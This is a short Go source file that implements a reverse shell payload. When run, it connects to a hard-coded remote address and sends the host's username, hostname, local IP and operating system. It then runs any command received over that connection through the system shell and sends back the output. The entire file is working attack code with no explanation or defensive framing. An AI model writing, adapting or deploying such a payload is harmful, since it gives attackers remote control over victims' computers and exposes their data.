package main

import (
	"bufio"
	"log"
	"net"
	"os"
	"os/exec"
	"os/user"
	"runtime"
	"strings"
)

func GetOutboundIP() string {
	conn, err := net.Dial("udp", "8.8.8.8:80")
	if err != nil {
		return "N/A"
	}
	defer conn.Close()
	localAddr := conn.LocalAddr().(*net.UDPAddr)
	return localAddr.IP.String()
}

func sendMetadata(conn net.Conn) {
	u, _ := user.Current()
	hostname, _ := os.Hostname()
	ip := GetOutboundIP()

	msg := "[+] Golang payload:\n" +
		"\t- Username: " + u.Username + "\n" +
		"\t- Hostname: " + hostname + "\n" +
		"\t- LocalIP: " + ip + "\n" +
		"\t- OS: " + runtime.GOOS + "\n"

	conn.Write([]byte(msg + "\n"))
}

func executeCommand(command string) string {
	var cmd *exec.Cmd

	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/C", command)
	} else {
		cmd = exec.Command("sh", "-c", command)
	}

	output, err := cmd.CombinedOutput()
	if err != nil {
		return "[Error] " + err.Error() + "\n" + string(output)
	}
	return string(output)
}

func handleCommands(conn net.Conn) {
	scanner := bufio.NewScanner(conn)
	for scanner.Scan() {
		command := scanner.Text()

		result := executeCommand(command)

		lines := strings.Split(result, "\n")
		for _, line := range lines {
			if strings.TrimSpace(line) != "" {
				conn.Write([]byte(line + "\n"))
			}
		}
	}
}

func main() {
	conn, err := net.Dial("tcp", "192.168.1.7:1234")
	if err != nil {
		log.Fatal("Connexion échouée :", err)
	}
	defer conn.Close()

	sendMetadata(conn)
	handleCommands(conn)
}
